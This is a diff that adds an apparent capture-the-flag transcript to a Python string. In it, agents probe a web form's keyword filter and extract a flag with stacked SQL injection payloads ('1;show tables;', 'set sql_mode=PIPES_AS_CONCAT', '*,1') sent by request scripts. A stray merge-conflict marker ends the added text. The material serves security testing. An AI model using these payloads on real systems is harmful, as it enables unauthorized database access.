@@ -343,6 +343,271 @@ code_exec_agent (to user_proxy):
 exitcode: 0 (execution succeeded)
 Code output:
 flag{49521e9a-8255-4dbd-a5dc-42a2325a8e0b}
+code_exec_agent (to user_proxy):
+
+exitcode: 0 (execution succeeded)
+Code output: 
+Query: flag
+
+<html>
+<head>
+</head>
+
+<body>
+
+<a> Give me your flag, I will tell you if the flag is right. </a>
+<form action="" method="post">
+<input type="text" name="query">
+<input type="submit">
+</form>
+</body>
+</html>
+
+Nonono.
+--------------------------------------------------
+Query: union
+
+<html>
+<head>
+</head>
+
+<body>
+
+<a> Give me your flag, I will tell you if the flag is right. </a>
+<form action="" method="post">
+<input type="text" name="query">
+<input type="submit">
+</form>
+</body>
+</html>
+
+Nonono.
+--------------------------------------------------
+Query: xml
+
+<html>
+<head>
+</head>
+
+<body>
+
+<a> Give me your flag, I will tell you if the flag is right. </a>
+<form action="" method="post">
+<input type="text" name="query">
+<input type="submit">
+</form>
+</body>
+</html>
+
+Nonono.
+--------------------------------------------------
+Query: where
+
+<html>
+<head>
+</head>
+
+<body>
+
+<a> Give me your flag, I will tell you if the flag is right. </a>
+<form action="" method="post">
+<input type="text" name="query">
+<input type="submit">
+</form>
+</body>
+</html>
+
+Nonono.
+--------------------------------------------------
+Query: and
+
+<html>
+<head>
+</head>
+
+<body>
+
+<a> Give me your flag, I will tell you if the flag is right. </a>
+<form action="" method="post">
+<input type="text" name="query">
+<input type="submit">
+</form>
+</body>
+</html>
+
+Nonono.
+--------------------------------------------------
+Query: or
+
+<html>
+<head>
+</head>
+
+<body>
+
+<a> Give me your flag, I will tell you if the flag is right. </a>
+<form action="" method="post">
+<input type="text" name="query">
+<input type="submit">
+</form>
+</body>
+</html>
+
+Nonono.
+--------------------------------------------------
+
+
+--------------------------------------------------------------------------------
+user_proxy (to code_exec_agent):
+
+The input number has echo 1, and the input character has no echo, indicating that || exists in the query. some injection keywords have echo Nonono, indicating that some injection keywords are filtered out. Test if stack injection is available. Try to submit "1;show tables;"
+
+--------------------------------------------------------------------------------
+**********要执行的代码**********
+```python
+import requests
+
+# URL of the target website
+url = "http://47.251.44.45:40312/"
+
+# Data to send in POST request
+data = {'query': '1;show tables;'}
+
+# Send a POST request to the website with the data
+response = requests.post(url, data=data)
+
+# Check if the request was successful
+if response.status_code == 200:
+    # If successful, print the content of the website
+    print(response.content.decode())
+else:
+    # If the request failed, print the status code
+    print("Error: Status code", response.status_code)
+```
+**********开始执行代码**********
+
+>>>>>>>> EXECUTING CODE BLOCK 0 (inferred language is python)...
+code_exec_agent (to user_proxy):
+
+exitcode: 0 (execution succeeded)
+Code output: 
+
+<html>
+<head>
+</head>
+
+<body>
+
+<a> Give me your flag, I will tell you if the flag is right. </a>
+<form action="" method="post">
+<input type="text" name="query">
+<input type="submit">
+</form>
+</body>
+</html>
+
+Array
+(
+    [0] => 1
+)
+Array
+(
+    [0] => Flag
+)
+
+
+
+--------------------------------------------------------------------------------
+user_proxy (to code_exec_agent):
+
+The back-end query may be: select $_POST['query']||flag from Flag. Test whether the design payload can find flag column information. Try to submit "1;set sql_mode=PIPES_AS_CONCAT;select 1" or "*,1"
+
+--------------------------------------------------------------------------------
+**********要执行的代码**********
+```python
+import requests
+
+# URL of the target website
+url = "http://47.251.44.45:40312/"
+
+# Payloads to test
+payloads = ["1;set sql_mode=PIPES_AS_CONCAT;select 1", "*,1"]
+
+# Loop through each payload and send a POST request
+for payload in payloads:
+    # Data to send in POST request
+    data = {'query': payload}
+    
+    # Send a POST request to the website with the data
+    response = requests.post(url, data=data)
+    
+    # Check if the request was successful
+    if response.status_code == 200:
+        # Print the payload and the response content
+        print(f"Payload: {payload}")
+        print(response.content.decode())
+        print("-" * 50)  # Separator for better readability
+    else:
+        # Print the payload and the error status code
+        print(f"Payload: {payload}")
+        print("Error: Status code", response.status_code)
+        print("-" * 50)  # Separator for better readability
+```
+**********开始执行代码**********
+
+>>>>>>>> EXECUTING CODE BLOCK 0 (inferred language is python)...
+code_exec_agent (to user_proxy):
+
+exitcode: 0 (execution succeeded)
+Code output: 
+Payload: 1;set sql_mode=PIPES_AS_CONCAT;select 1
+
+<html>
+<head>
+</head>
+
+<body>
+
+<a> Give me your flag, I will tell you if the flag is right. </a>
+<form action="" method="post">
+<input type="text" name="query">
+<input type="submit">
+</form>
+</body>
+</html>
+
+Array
+(
+    [0] => 1
+)
+Array
+(
+    [0] => 1flag{NLP_Security_Test}
+)
+
+--------------------------------------------------
+Payload: *,1
+
+<html>
+<head>
+</head>
+
+<body>
+
+<a> Give me your flag, I will tell you if the flag is right. </a>
+<form action="" method="post">
+<input type="text" name="query">
+<input type="submit">
+</form>
+</body>
+</html>
+
+Array
+(
+    [0] => flag{NLP_Security_Test}
+    [1] => 1
+)
+>>>>>>> b4577a30e974001a7e659344fcbdf4496bacc81f
 """.strip()
 
 # Python Coder agent
